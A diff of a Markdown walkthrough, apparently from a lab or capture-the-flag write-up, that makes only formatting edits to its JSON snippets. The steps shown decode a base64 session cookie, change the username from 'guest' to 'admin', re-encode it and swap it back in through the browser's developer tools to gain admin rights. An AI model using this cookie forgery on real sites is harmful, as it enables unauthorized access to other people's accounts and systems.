@@ -6,18 +6,18 @@
     echo "<cookie_value>" | base64 --decode
     ```
 
-    This will give you a JSON object like this: `{"username":"guest"}`
+    This will give you a JSON object like this: `{"username": "guest"}`
 
 4.  **Modify the cookie**: Change the username to `admin`:
 
     ```json
-    {"username":"admin"}
+    {"username": "admin"}
     ```
 
 5.  **Encode the cookie**: Now, encode the modified JSON object back to Base64:
 
     ```bash
-    echo '{"username":"admin"}' | base64
+    echo '{"username": "admin"}' | base64
     ```
 
 6.  **Set the new cookie**: Go back to the browser's developer tools and replace the old cookie value with the new Base64 encoded string.
